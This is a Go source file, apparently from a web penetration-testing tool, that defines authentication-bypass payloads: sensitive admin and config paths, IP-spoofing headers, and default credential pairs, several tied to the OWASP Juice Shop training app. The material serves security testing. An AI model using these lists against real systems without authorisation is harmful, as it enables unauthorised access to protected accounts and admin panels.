package techniques

// AuthBypassPatterns for authentication bypass testing.
var AuthBypassPatterns = []string{
	"/admin",
	"/admin/",
	"/administrator",
	"/api/admin",
	"/dashboard",
	"/internal",
	"/debug",
	"/actuator",
	"/actuator/env",
	"/swagger-ui.html",
	"/api-docs",
	"/.env",
	"/config",
	"/backup",
	"/wp-admin",
	"/phpmyadmin",
}

// AuthBypassHeaders for header-based auth bypass.
var AuthBypassHeaders = map[string]string{
	"X-Original-URL":     "/admin",
	"X-Rewrite-URL":      "/admin",
	"X-Forwarded-For":    "127.0.0.1",
	"X-Remote-IP":        "127.0.0.1",
	"X-Custom-IP-Auth":   "127.0.0.1",
	"X-Real-IP":          "127.0.0.1",
}

// DefaultCredentials for common default login attempts.
type Credential struct {
	Username string
	Password string
}

var DefaultCredentials = []Credential{
	{"admin@juice-sh.op", "admin123"},
	{"admin", "admin"},
	{"admin", "admin123"},
	{"admin", "password"},
	{"admin", "123456"},
	{"administrator", "administrator"},
	{"root", "root"},
	{"root", "toor"},
	{"test", "test"},
	{"user", "user"},
	{"admin", "Admin@123"},
	{"admin@admin.com", "admin"},
	{"admin@example.com", "admin"},
	{"mc.safesearch@juice-sh.op", "Mr. N00dles"},
	{"jim@juice-sh.op", "ncc-1701"},
	{"bender@juice-sh.op", "OhG0dPlease1nsique"},
}

// AuthBypassDescription describes the auth bypass technique.
const AuthBypassDescription = "Authentication Bypass - Tests for unauthorized access to protected endpoints and admin panels"
